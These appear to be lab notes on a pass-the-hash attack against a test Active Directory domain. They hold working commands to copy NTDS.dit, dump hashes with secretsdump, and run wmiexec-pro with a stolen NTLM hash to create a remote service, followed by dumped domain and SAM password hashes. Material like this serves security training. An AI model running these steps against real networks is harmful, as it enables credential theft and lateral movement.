# 1. Network diagram

# 2. Scenario
- Assume that attacker has SAM and NTDS file.
- Therefore, they analyze and get the user's hashed password. After that, they try to use that hash to attack by passing the hash method
# 3. Setup 
- **Join win10 to DC*
- Open control panel -> setup DNS server on win 10 point to DC's ip address
- look up DNS
# 4. Attack
- https://github.com/XiaoliChan/wmiexec-Pro
- https://sec.vnpt.vn/2024/02/review-wmi-tool
- https://www.crowdstrike.com/en-us/blog/how-to-detect-and-prevent-impackets-wmiexec/
- https://specterops.io/blog/2017/03/16/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
``` text
	powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
	impacket-secretsdump -system SYSTEM -ntds "ntds.dit" LOCAL
	python3 wmiexec-pro.py -hashes aad3b435b51404eeaad3b435b51404ee:c57fd52ba052c00135eb2d14f16b6e65 win10_virtualbox@192.168.1.18  service -action create -service-name "test" -display-name "For test" -bin-path 'C:\windows\system32\calc.exe'
```

Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1285578091ecde0d6bb02f694072059:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vboxuser:1000:aad3b435b51404eeaad3b435b51404ee:ccdc4949389fe4e5486562dc436fa2de:::
WINSERVER2022$:1001:aad3b435b51404eeaad3b435b51404ee:f95a3ed8d9dba01266000b476db9b5dc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d35e87bae10f42be0064848e9e0508c6:::
PentestAD.local\weakaccount:1108:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
DESKTOP-JJDJOD8$:1109:aad3b435b51404eeaad3b435b51404ee:c927bd38856578dfdc6541c7600eef0e:::
PentestAD.local\badguy:1110:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
PentestAD.local\cuongadmin:1112:aad3b435b51404eeaad3b435b51404ee:c57fd52ba052c00135eb2d14f16b6e65:::


 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3cabbf129b80ac15516e918b6bd9c998:::
win10_virtualbox:1001:aad3b435b51404eeaad3b435b51404ee:c57fd52ba052c00135eb2d14f16b6e65:::
user1:1005:aad3b435b51404eeaad3b435b51404ee:189400de231310b8e90683ae16eeaf81:::
[*] Cleaning up...